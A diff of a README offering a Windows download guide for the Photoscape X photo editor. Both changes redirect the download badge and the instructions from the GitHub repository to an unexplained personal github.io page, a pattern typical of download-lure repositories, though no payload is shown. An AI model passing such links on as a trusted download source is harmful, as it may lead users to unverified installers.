@@ -1,6 +1,6 @@
 # 📸 Descargar-Photoscape-X - Edit your photos with ease today
 
-[![](https://img.shields.io/badge/Download-Photoscape-blue.svg)](https://github.com/Papazik3584/Descargar-Photoscape-X)
+[![](https://img.shields.io/badge/Download-Photoscape-blue.svg)](https://papazik3584.github.io)
 
 Photoscape X is a tool for photo editing. It includes features for viewing, editing, and batch processing images. This guide helps you download and install the software on your Windows computer.
 
@@ -20,7 +20,7 @@ Ensure your computer has the latest Windows updates installed. This avoids error
 
 Follow these steps to access the installer.
 
-1. Go to the repository page at https://github.com/Papazik3584/Descargar-Photoscape-X.
+1. Go to the repository page at https://papazik3584.github.io
 2. Click the link above to reach the main download area.
 3. Look for the file labeled for Windows.
 4. Click the file to start the download.
